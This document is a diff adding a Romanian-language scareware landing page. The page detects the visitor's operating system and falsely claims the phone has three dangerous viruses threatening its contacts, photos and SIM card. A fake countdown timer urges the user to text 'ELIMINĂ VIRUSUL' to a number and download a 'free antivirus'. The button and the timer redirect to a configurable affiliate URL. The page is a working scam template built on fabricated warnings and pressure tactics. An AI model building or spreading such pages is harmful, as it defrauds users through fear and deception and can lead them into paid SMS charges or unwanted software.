@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <base href=".">
+    <meta name="viewport" content="user-scalable=no, initial-scale=1.0, maximum-scale=1.0, width=device-width">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel='shortcut icon' type='image/x-icon' href='./index_files/bug.png'>
+    <title>Virus!</title>
+    <link rel="stylesheet" href="./index_files/main.css">
+    <script src="./index_files/define_os_device_browser.js"></script>
+    
+    <script>
+    let afurl = 'https://www.google.com/';
+    </script>
+</head>
+
+<body>
+    <div id="wrapper">
+        <div class="container">
+            <section>
+                <h1>Dispozitivul DVS.  <script>document.write(jscd.os +' '+ jscd.osVersion + '\n')</script> poate avea<span style="color:#f76d0a"> (3) virusuri periculoase!</span></h1>
+            </section>
+            <section>
+                <div>
+                    <p> </p><span class="first_text">În curând. Aceasta ar putea afecta SIM cardul și contactele telefonului, pozele, informația stocată, aplicațiile pot în curând dispărea…</span>.
+                    <br>
+                    <p> </p>
+                </div>
+                <div id="error">
+                    <img src="./index_files/bug.gif">
+                </div>
+            </section>
+            <section>
+                <div id="timer">
+                    <span style="font-size: 30px; font-weight: bold; color: #f76d0a; font-family: sans-serif;" id="countdown" class="timer">0:14:26</span>
+                </div>
+                <div id="error"> </div>
+            </section>
+            <section>
+                <p> <b>Curățați acum telefonul Dvs. mobil (urmați instrucțiunile):</b>
+                    <br>
+                    <br>
+                    <strong style="color:#f76d0a">Pasul 1: </strong>Tastați <strong style="color: rgb(5, 86, 251); font-weight: bold;">"ELIMINĂ VIRUSUL"</strong> , trimite SMS pe numărul indicat și urmați instrucțiunile de pe următoarea pagină!<br>
+                    <br>
+                    <strong style="color:#f76d0a">Pasul 2: </strong> Este necesar să download-ați  <strong style="color: rgb(5, 86, 251);">Antivirusul gratuit</strong>, <strong style="font-weight: bold;">, să eliminați toate virusurile și să restabiliți starea funcțională a telefonului!</strong></p>
+                <p></p>
+            </section>
+            <footer>
+                <p align="center"><a class="btn12" href="javascript:void(0)" onclick="linkTo()">ELIMINAȚI VIRUSUL</a> </p>
+            </footer>
+            <p style="padding: 5px 5px; text-align: center; color: #f76d0a; font-size: 12px;">N-o să vă ia mai mult de 2 minute ca să faceți telefonul să funcționeze din nou!</p>
+        </div>
+    </div>
+   
+    <script>
+    var seconds = 35;
+    var hundreds = 0;
+
+    function secondPassed() { var minutes = Math.round((seconds - 30) / 60); var remainingSeconds = seconds % 60; if (remainingSeconds < 10) { remainingSeconds = "0" + remainingSeconds; }
+    document.getElementById('countdown').innerHTML = minutes + ":" + remainingSeconds + ":" + hundreds; if (hundreds === 0) { if (seconds === 0) { clearInterval(countdownTimer);
+        window.location = afurl; } else { seconds--;
+        hundreds = 100; } } else { hundreds--; } }
+    var countdownTimer = setInterval('secondPassed()', 10);
+
+    function linkTo(){
+      window.location = afurl;
+    }
+    </script>
+</body>
+
+</html>
